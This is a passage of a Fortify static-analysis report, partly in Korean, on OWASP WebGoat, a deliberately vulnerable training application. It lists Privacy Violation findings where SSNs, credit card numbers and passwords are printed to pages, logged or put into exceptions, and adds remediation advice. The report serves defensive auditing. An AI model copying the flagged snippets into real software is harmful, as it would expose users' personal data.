훌륭한 개인 정보 관리를 위해서는 내부 개인 정보 지침을 작성하여 엄격하게 준수해야 합니다. 지침에는 응용 프로그램이 개인 정보 데이터를 처리하는 방식을 구체적으로 기술해야 합니다. 조직이 연방법 또는 주법에 따라 규제를 받는 경우, 개인 정보 지침이 법적 요구 사항을 만족하도록 합니다. 조직이 규제를 받지 않는 경우에도 개인 정보를 보호해야 합니다. 그렇지 않으면 고객의 신뢰를 잃을 위험이 있습니다.

개인 정보에 관한 최선의 정책은 노출을 최소화하는 것입니다. 업무 수행에 반드시 필요한 경우를 제외하고 응용 프로그램, 프로세스 및 직원에게 개인 정보에 대한 접근 권한을 부여해서는 안 됩니다. 필요 이상의 권한으로 작업을 수행할 수 없다는 최소 권한 원칙과 함께 개인 정보에 대한 접근을 최소한의 그룹으로 제한하는 것이 좋습니다.

모바일 응용 프로그램이 장치에서 실행되는 다른 응용 프로그램에 민감한 데이터를 전달하지 않도록 합니다. 개인 정보를 저장해야 하는 경우에는 항상 암호화해야 합니다. Android의 경우 SQLite 데이터베이스를 사용하는 다른 플랫폼과 마찬가지로 SQLCipher를 대신 사용하는 것이 좋습니다. SQLCipher는 SQLite 데이터베이스에 대한 확장으로, 데이터베이스 파일의 투명한 256비트 AES 암호화를 제공합니다. 따라서 암호화된 데이터베이스에 자격 증명을 저장할 수 있습니다.

예제 3: 다음 코드는 필요한 바이너리를 다운로드한 후 SQLCipher를 Android 응용 프로그램에 통합하고 자격 증명을 데이터베이스 파일에 저장하는 방법을 보여줍니다.

import net.sqlcipher.database.SQLiteDatabase;
...
  SQLiteDatabase.loadLibs(this);
  File dbFile = getDatabasePath("credentials.db");
  dbFile.mkdirs();
  dbFile.delete();
  SQLiteDatabase db = SQLiteDatabase.openOrCreateDatabase(dbFile, "credentials", null);
  db.execSQL("create table credentials(u, p)");
  db.execSQL("insert into credentials(u, p) values(?, ?)", new Object[]{username, password});
...


android.database.sqlite.SQLiteDatabase 관련 참조는 net.sqlcipher.database.SQLiteDatabase 관련 참조로 대체됩니다.

WebView 저장소에서 암호화를 활성화하려면 sqlcipher.so 라이브러리를 사용하여 WebKit를 다시 컴파일해야 합니다.

예제 4: 다음 코드는 Android WebView 저장소에서 지정된 사이트의 사용자 이름과 암호를 읽은 다음 이를 등록된 모든 수신자로 브로드캐스트하는 대신, 동일한 응용 프로그램 내의 다른 부분만 브로드캐스트를 볼 수 있도록 내부적으로만 브로드캐스트합니다.

...
webview.setWebViewClient(new WebViewClient() {
  public void onReceivedHttpAuthRequest(WebView view,
        HttpAuthHandler handler, String host, String realm) {
    String[] credentials = view.getHttpAuthUsernamePassword(host, realm);
    String username = credentials[0];
    String password = credentials[1];
    Intent i = new Intent();
    i.setAction("SEND_CREDENTIALS");
    i.putExtra("username", username);
    i.putExtra("password", password);
    LocalBroadcastManager.getInstance(view.getContext()).sendBroadcast(i);
  }
});
...
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. Privacy Violation에 대비한 철저한 감사의 일환으로 사용자 지정 규칙을 작성하여 프로그램에 입력되는 개인 정보 또는 기타 민감한 정보의 모든 출처를 식별하도록 합니다. 개인 정보 출처 대부분은 자동으로 식별할 수 없습니다. 사용자 지정 규칙이 없으면 privacy violation 검사는 상당히 불완전할 것입니다.

2. Fortify Java Annotations FortifyPassword, FortifyNotPassword, FortifyPrivate 및 FortifyNotPrivate를 사용하여 암호 및 개인 정보를 나타내는 필드 및 변수를 표시할 수 있습니다.

3. 많은 최신 웹 프레임워크는 사용자 입력의 검증을 수행하기 위한 메커니즘을 제공합니다(Struts 및 Spring MVC 포함). 확인되지 않은 입력의 소스를 강조하기 위해, Fortify 보안 코딩 규칙 팩은 악용 가능성을 낮추고 프레임워크 검증 메커니즘이 사용 중일 때마다 지원하는 증거에 포인터를 제공하여 Fortify Static Code Analyzer에서 보고한 문제의 우선 순위를 동적으로 재지정합니다. 이 기능을 Context-Sensitive Ranking(컨텍스트 감지 순위)이라고 부릅니다. Fortify 사용자의 감사 프로세스를 지원하기 위해, Fortify Software Security Research Group은 입력 소스에 적용된 검증 메커니즘에 따라 문제를 폴더로 그룹화하는 데이터 유효성 프로젝트 템플릿을 사용 가능하게 만듭니다.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>89</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="CF272EEF4690E8F39DFDE650DDECC6D5" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.SSN%&gt;" type="text" value="&lt;%=employee.getSsn()%&gt;"/&gt; 
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.SSN%&gt;" type="text" value="&lt;%=employee.getSsn()%&gt;"/&gt; 
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>org.owasp.webgoat.session.Employee.getSsn()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="8FD35C8F85AA13C33B6A545EEDAC5D5D" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ParameterNotFoundException.java의 ParameterNotFoundException() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ParameterNotFoundException.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterNotFoundException.java</FilePath>
<LineStart>54</LineStart>
<Snippet>    public ParameterNotFoundException(String s)
    {
	super(s);
    }
}</Snippet>
<TargetFunction>java.lang.Exception.Exception()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/UpdateProfile.java</FilePath>
<LineStart>95</LineStart>
<Snippet>		    RoleBasedAccessControl.CCN);
	    int ccnLimit = s.getParser().getIntParameter(
		    RoleBasedAccessControl.CCN_LIMIT);
	    String disciplinaryActionDate = s.getParser().getStringParameter(
		    RoleBasedAccessControl.DISCIPLINARY_DATE);</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.RoleBasedAccessControl.RoleBasedAccessControl.CCN_LIMIT()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="5E69A727A231CD8ECF1311C4DABF86BD" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ParameterNotFoundException.java의 ParameterNotFoundException() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ParameterNotFoundException.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterNotFoundException.java</FilePath>
<LineStart>54</LineStart>
<Snippet>    public ParameterNotFoundException(String s)
    {
	super(s);
    }
}</Snippet>
<TargetFunction>java.lang.Exception.Exception()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/UpdateProfile.java</FilePath>
<LineStart>93</LineStart>
<Snippet>		    RoleBasedAccessControl.SALARY);
	    String ccn = s.getParser().getStringParameter(
		    RoleBasedAccessControl.CCN);
	    int ccnLimit = s.getParser().getIntParameter(
		    RoleBasedAccessControl.CCN_LIMIT);</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.RoleBasedAccessControl.RoleBasedAccessControl.CCN()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="CA243C0FD3E0DF9510DE54FEFC1F0E53" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getCcn()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getCcn()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>org.owasp.webgoat.session.Employee.getCcn()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="3E10B89B5E2952BF0112AAF5A6B60C5C" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ParameterParser.java의 getStringParameter() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>695</LineStart>
<Snippet>	if (values == null)
	{
	    throw new ParameterNotFoundException(name + " not found");
	}
	else if (values[0].length() == 0)</Snippet>
<TargetFunction>org.owasp.webgoat.session.ParameterNotFoundException.ParameterNotFoundException()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WeakSessionID.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WeakSessionID.java</FilePath>
<LineStart>232</LineStart>
<Snippet>	try
	{
	    password = s.getParser().getStringParameter(PASSWORD);
	}
	catch (ParameterNotFoundException pnfe)</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.WeakSessionID.PASSWORD()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="FC830FBA2CC2EC295A51F39394922E41" ruleID="E1AFC322-743D-44BB-A93F-91ECC9D871E1">
                            <Category>Privacy Violation</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>HammerHead.java의 dumpSession() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>246</LineStart>
<Snippet>	    Object value = session.getAttribute(name);
	    System.out.println("Name: " + name);
	    System.out.println("Value: " + value);
	}
    }</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Employee.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/Employee.java</FilePath>
<LineStart>90</LineStart>
<Snippet>	this.firstName = firstName;
	this.lastName = lastName;
	this.ssn = ssn;
	this.title = title;
	this.phone = phone;</Snippet>
<TargetFunction>Read ssn()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="3E0608F1FDEE4BB9F5EBA611961CA367" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ParameterParser.java의 getStringParameter() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>695</LineStart>
<Snippet>	if (values == null)
	{
	    throw new ParameterNotFoundException(name + " not found");
	}
	else if (values[0].length() == 0)</Snippet>
<TargetFunction>org.owasp.webgoat.session.ParameterNotFoundException.ParameterNotFoundException()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/UpdateProfile.java</FilePath>
<LineStart>77</LineStart>
<Snippet>		    RoleBasedAccessControl.LAST_NAME);
	    String ssn = s.getParser().getStringParameter(
		    RoleBasedAccessControl.SSN);
	    String title = s.getParser().getStringParameter(
		    RoleBasedAccessControl.TITLE);</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.RoleBasedAccessControl.RoleBasedAccessControl.SSN()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="CB4C984A1BA521A2604E9BBCEF6995F0" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ParameterNotFoundException.java의 ParameterNotFoundException() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ParameterNotFoundException.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterNotFoundException.java</FilePath>
<LineStart>54</LineStart>
<Snippet>    public ParameterNotFoundException(String s)
    {
	super(s);
    }
}</Snippet>
<TargetFunction>java.lang.Exception.Exception()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WsSAXInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WsSAXInjection.java</FilePath>
<LineStart>149</LineStart>
<Snippet>	    ec.addElement(makeInputLine(s));

	    password = s.getParser().getRawParameter(PASSWORD, null);

	    PRE pre = new PRE();</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.WsSAXInjection.PASSWORD()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="129D40F299654B6D604FFC2512F2F537" ruleID="E1AFC322-743D-44BB-A93F-91ECC9D871E1">
                            <Category>Privacy Violation</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>HammerHead.java의 dumpSession() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>246</LineStart>
<Snippet>	    Object value = session.getAttribute(name);
	    System.out.println("Name: " + name);
	    System.out.println("Value: " + value);
	}
    }</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Employee.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/Employee.java</FilePath>
<LineStart>98</LineStart>
<Snippet>	this.startDate = startDate;
	this.salary = salary;
	this.ccn = ccn;
	this.ccnLimit = ccnLimit;
	this.disciplinaryActionDate = disciplinaryActionDate;</Snippet>
<TargetFunction>Read ccn()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="4C152E7D555F91D3A6EAFEC6063DFA6B" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ParameterParser.java의 getRawParameter() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>631</LineStart>
<Snippet>	if (values == null)
	{
	    throw new ParameterNotFoundException(name + " not found");
	}
	else if (values[0].length() == 0)</Snippet>
<TargetFunction>org.owasp.webgoat.session.ParameterNotFoundException.ParameterNotFoundException()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>FailOpenAuthentication.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/FailOpenAuthentication.java</FilePath>
<LineStart>73</LineStart>
<Snippet>	    {
		username = s.getParser().getRawParameter(USERNAME);
		password = s.getParser().getRawParameter(PASSWORD);

		// if credentials are bad, send the login page</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.WeakAuthenticationCookie.PASSWORD()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="CB5EA5F88F4DCDB88C8B841F5DE32068" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>53</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.SSN%&gt;" type="text" value="&lt;%=employee.getSsn()%&gt;"/&gt; 
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>53</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.SSN%&gt;" type="text" value="&lt;%=employee.getSsn()%&gt;"/&gt; 
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.RoleBasedAccessControl.RoleBasedAccessControl.SSN()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="0F9075FB829A58EDC38EE064182D0933" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ParameterParser.java의 getStringParameter() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>699</LineStart>
<Snippet>	else if (values[0].length() == 0)
	{
	    throw new ParameterNotFoundException(name + " was empty");
	}
	else</Snippet>
<TargetFunction>org.owasp.webgoat.session.ParameterNotFoundException.ParameterNotFoundException()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WeakSessionID.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WeakSessionID.java</FilePath>
<LineStart>232</LineStart>
<Snippet>	try
	{
	    password = s.getParser().getStringParameter(PASSWORD);
	}
	catch (ParameterNotFoundException pnfe)</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.WeakSessionID.PASSWORD()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="05EA9527196B6F22F32EB012FECD9B19" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>58</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;%=employee.getSsn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Employee.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/Employee.java</FilePath>
<LineStart>204</LineStart>
<Snippet>    public String getSsn()
    {
	return ssn;
    }
</Snippet>
<TargetFunction>Read this.ssn()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="BED13FB389450D63713AE49D474E2840" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ParameterParser.java의 getRawParameter() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>635</LineStart>
<Snippet>	else if (values[0].length() == 0)
	{
	    throw new ParameterNotFoundException(name + " was empty");
	}
</Snippet>
<TargetFunction>org.owasp.webgoat.session.ParameterNotFoundException.ParameterNotFoundException()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WsSAXInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WsSAXInjection.java</FilePath>
<LineStart>149</LineStart>
<Snippet>	    ec.addElement(makeInputLine(s));

	    password = s.getParser().getRawParameter(PASSWORD, null);

	    PRE pre = new PRE();</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.WsSAXInjection.PASSWORD()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="287000CB289F94A2D000C2135A46B8E1" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ParameterNotFoundException.java의 ParameterNotFoundException() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ParameterNotFoundException.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterNotFoundException.java</FilePath>
<LineStart>54</LineStart>
<Snippet>    public ParameterNotFoundException(String s)
    {
	super(s);
    }
}</Snippet>
<TargetFunction>java.lang.Exception.Exception()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>HtmlClues.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/HtmlClues.java</FilePath>
<LineStart>80</LineStart>
<Snippet>    {
	String username = s.getParser().getRawParameter(USERNAME, "");
	String password = s.getParser().getRawParameter(PASSWORD, "");

	//&lt;START_OMIT_SOURCE&gt;</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.HtmlClues.PASSWORD()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="53B8608CDA8C228F8DC4AECB84BBEEBD" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ParameterParser.java의 getStringParameter() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>699</LineStart>
<Snippet>	else if (values[0].length() == 0)
	{
	    throw new ParameterNotFoundException(name + " was empty");
	}
	else</Snippet>
<TargetFunction>org.owasp.webgoat.session.ParameterNotFoundException.ParameterNotFoundException()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/UpdateProfile.java</FilePath>
<LineStart>95</LineStart>
<Snippet>		    RoleBasedAccessControl.CCN);
	    int ccnLimit = s.getParser().getIntParameter(
		    RoleBasedAccessControl.CCN_LIMIT);
	    String disciplinaryActionDate = s.getParser().getStringParameter(
		    RoleBasedAccessControl.DISCIPLINARY_DATE);</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.RoleBasedAccessControl.RoleBasedAccessControl.CCN_LIMIT()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="314C3E7323FE764AB7025F2C9E133EDD" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>73</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.CCN_LIMIT%&gt;" type="text" value="&lt;%=employee.getCcnLimit()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>73</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.CCN_LIMIT%&gt;" type="text" value="&lt;%=employee.getCcnLimit()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.SQLInjection.SQLInjection.CCN_LIMIT()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="9A668363C7656CA44FE8CF0E0E89FC83" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;span class="lesson_text_db"&gt;&lt;%=employee.getSsn()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Employee.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/Employee.java</FilePath>
<LineStart>90</LineStart>
<Snippet>	this.firstName = firstName;
	this.lastName = lastName;
	this.ssn = ssn;
	this.title = title;
	this.phone = phone;</Snippet>
<TargetFunction>Read ssn()</TargetFunction>
                            </Source>
                        </Issue>
